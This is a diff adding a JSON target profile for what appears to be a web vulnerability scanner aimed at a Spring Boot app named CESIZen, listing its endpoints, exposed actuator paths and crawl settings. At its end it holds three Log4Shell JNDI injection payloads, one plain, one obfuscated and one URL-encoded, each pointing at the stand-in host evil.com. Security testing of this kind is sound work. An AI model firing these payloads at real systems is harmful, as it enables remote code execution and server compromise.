@@ -1,0 +1,55 @@
+{
+  "name": "CESIZen Java Spring Boot",
+  "url": "https://cesizen-java.herokuapp.com",
+  "auth": {
+    "bearer": null,
+    "header": "Authorization"
+  },
+  "endpoints": [
+    "/",
+    "/api/auth/login",
+    "/api/auth/register",
+    "/api/users",
+    "/api/admin/users",
+    "/api/emotions",
+    "/api/activities",
+    "/admin/dashboard",
+    "/actuator/health",
+    "/actuator/info",
+    "/swagger-ui.html",
+    "/v2/api-docs"
+  ],
+  "exclude": [
+    "\\.css$",
+    "\\.js$",
+    "\\.png$",
+    "\\.jpg$",
+    "^/static/",
+    "^/webjars/"
+  ],
+  "discover": {
+    "crawl": true,
+    "maxPages": 15
+  },
+  "techStack": "Spring Boot + JPA + MySQL/PostgreSQL",
+  "javaSpecific": {
+    "actuatorEndpoints": [
+      "/actuator/env",
+      "/actuator/configprops",
+      "/actuator/beans",
+      "/actuator/mappings",
+      "/actuator/trace"
+    ],
+    "springPaths": [
+      "/error",
+      "/login",
+      "/logout",
+      "/oauth/token"
+    ],
+    "javaPayloads": [
+      "${jndi:ldap://evil.com/a}",
+      "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
+      "%24%7Bjndi%3Aldap%3A//evil.com/a%7D"
+    ]
+  }
+}
